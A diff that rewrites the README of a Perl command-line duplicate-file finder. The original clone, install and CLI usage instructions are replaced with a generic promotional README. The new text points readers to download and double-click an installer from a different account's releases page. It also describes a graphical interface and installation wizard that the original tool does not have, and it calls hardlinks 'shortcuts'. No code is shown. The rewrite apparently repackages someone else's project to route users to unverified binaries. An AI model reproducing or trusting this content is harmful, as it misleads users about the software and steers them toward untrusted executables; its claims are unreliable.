@@ -1,139 +1,68 @@
-<h1 align="center">DupeFinder</h1>
+# 🗂️ DupeFinder - Find and Manage Duplicate Files Easily
 
-<p align="center"><em>Fast file deduplication and disk space analyzer for Windows, Linux, and macOS.</em></p>
+## 📥 Download Now
+[![Download DupeFinder](https://img.shields.io/badge/download-DupeFinder-blue.svg)](https://github.com/naserhajipour/DupeFinder/releases)
 
+## 🚀 Getting Started
+Welcome to DupeFinder! This application helps you scan your directories to find duplicate files. Using secure cryptographic hashes, DupeFinder ensures accurate results. It's user-friendly and perfect for anyone looking to free up space on their device.
 
+## 🖥️ System Requirements
+To run DupeFinder, ensure your system meets the following requirements:
 
-DupeFinder scans directories to identify duplicate files using cryptographic hashes. It supports multiple hash algorithms, configurable file filters, and various actions including reporting, deleting, hardlinking, or moving duplicate files.
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** At least 2 GB
+- **Disk Space:** Minimum of 100 MB available
+- **Internet Connection:** Required for downloading and updates
 
-## Prerequisites
+## 🔍 Features
+DupeFinder offers several useful features:
 
-### Linux (Debian/Ubuntu)
+- **Multiple Hash Algorithms:** Choose from various hash methods for accuracy.
+- **Configurable File Filters:** Control which files to scan based on type.
+- **Versatile Actions:** Decide what to do with duplicates—report, delete, hardlink, or move.
+- **Detailed Reports:** Obtain clear reports of found duplicates.
+  
+## 📂 Download & Install
+To get DupeFinder, please visit our [Releases page](https://github.com/naserhajipour/DupeFinder/releases) to download the application.
 
-```bash
-sudo apt update
-sudo apt install perl cpanminus build-essential
-```
+1. Go to the releases page: [DupeFinder Releases](https://github.com/naserhajipour/DupeFinder/releases).
+2. Select the latest version.
+3. Download the file suitable for your operating system.
+4. Once downloaded, locate the file and double-click it to start the installation.
+5. Follow the prompts in the installation wizard.
+6. After installation, launch DupeFinder from your applications.
 
-### Linux (RHEL/CentOS/Fedora)
+## 🛠️ Using DupeFinder
+Here’s how to use DupeFinder to find and manage duplicates on your device:
 
-```bash
-sudo dnf install perl perl-App-cpanminus gcc make
-```
+1. **Launch the Application:** Open DupeFinder after installation.
+2. **Select a Directory:** Click on “Choose Directory” to select the folder you wish to scan.
+3. **Configure Filters:** Use file filters to include or exclude specific file types.
+4. **Start Scan:** Click on the “Scan” button to start the process. Wait for the scan to complete, as this may take some time depending on the directory size.
+5. **Review Results:** Once the scan finishes, DupeFinder will show a list of duplicates.
+6. **Manage Duplicates:** Choose an action:
+   - **Report:** View a report of duplicates without changing anything.
+   - **Delete:** Remove duplicates permanently.
+   - **Hardlink:** Create shortcuts to save space without deleting files.
+   - **Move:** Relocate selected duplicates to another directory.
 
-### macOS
+## ⚙️ Frequently Asked Questions (FAQs)
 
-```bash
-brew install perl cpanminus
-```
+### What types of files can DupeFinder scan?
+DupeFinder can scan any type of file based on your configured filters. You can choose to include or exclude specific file types.
 
-### Windows
+### Is it safe to delete files with DupeFinder?
+Yes, DupeFinder provides options for managing duplicates safely. Use the report function first to review before deleting.
 
-Download and install [Strawberry Perl](https://strawberryperl.com/) which includes cpanm.
+### Can I customize settings in DupeFinder?
+Yes, DupeFinder allows you to configure file filters and choose the hash algorithms for precision.
 
-## Installation
+## 🙋 Support
+For support or questions, please check the [issues page](https://github.com/naserhajipour/DupeFinder/issues) or contact us through the repository.
 
-```bash
-git clone https://github.com/muhammad-fiaz/DupeFinder.git
-cd DupeFinder
-cpanm --installdeps .
-chmod +x bin/dupefinder
-```
+## 📖 Additional Resources
+- **Documentation:** Visit our [Wiki](https://github.com/naserhajipour/DupeFinder/wiki) for detailed guidance.
+- **Contribution:** Interested in contributing? Check our contribution guidelines in the repository.
 
-Add to PATH (optional):
-
-```bash
-export PATH="$PWD/bin:$PATH"
-```
-
-## Usage
-
-### Basic Scan
-
-```bash
-./bin/dupefinder /path/to/directory
-```
-
-### Multiple Directories
-
-```bash
-./bin/dupefinder /home/user/photos /home/user/downloads
-```
-
-### Output Formats
-
-```bash
-./bin/dupefinder -f json -o report.json /data
-./bin/dupefinder -f yaml -o report.yaml /data
-./bin/dupefinder -f csv -o report.csv /data
-```
-
-### Filter by File Size
-
-```bash
-./bin/dupefinder -m 1024 -M 10485760 /data
-```
-
-### Filter by Extension
-
-```bash
-./bin/dupefinder -e jpg,png,gif /media/photos
-```
-
-### Delete Duplicates
-
-```bash
-# Dry run (default)
-./bin/dupefinder -A delete -k first /tmp/downloads
-
-# Execute
-./bin/dupefinder -A delete -N -k first /tmp/downloads
-```
-
-### Create Hardlinks
-
-```bash
-./bin/dupefinder -A hardlink -N /data/backups
-```
-
-### Move Duplicates
-
-```bash
-./bin/dupefinder -A move -d /tmp/dupes -N /data
-```
-
-### Use Config File
-
-```bash
-./bin/dupefinder -c config/dupefinder.yaml /data
-```
-
-## Options
-
-| Option | Description |
-|--------|-------------|
-| `-c, --config FILE` | Config file (YAML) |
-| `-o, --output FILE` | Output file for report |
-| `-f, --format FMT` | Output format: text, json, yaml, csv |
-| `-v, --verbose` | Verbose output |
-| `-q, --quiet` | Suppress progress messages |
-| `-C, --no-color` | Disable colored output |
-| `-n, --dry-run` | Dry run mode (default) |
-| `-N, --no-dry-run` | Execute file operations |
-| `-m, --min-size N` | Minimum file size in bytes |
-| `-M, --max-size N` | Maximum file size in bytes |
-| `-e, --extensions` | Comma-separated extensions |
-| `-a, --algorithm` | Hash: MD5, SHA1, SHA256, SHA512 |
-| `-A, --action` | Action: report, delete, hardlink, move |
-| `-k, --keep` | Keep first or last file |
-| `-d, --move-dir DIR` | Destination for moved duplicates |
-
-## Running Tests
-
-```bash
-prove -l t/
-```
-
-## License
-
-Apache License 2.0 - see [LICENSE](LICENSE)
+## ❤️ Acknowledgements
+Thank you for using DupeFinder! We hope it helps you keep your files organized and your storage optimized. Enjoy a clutter-free digital experience!
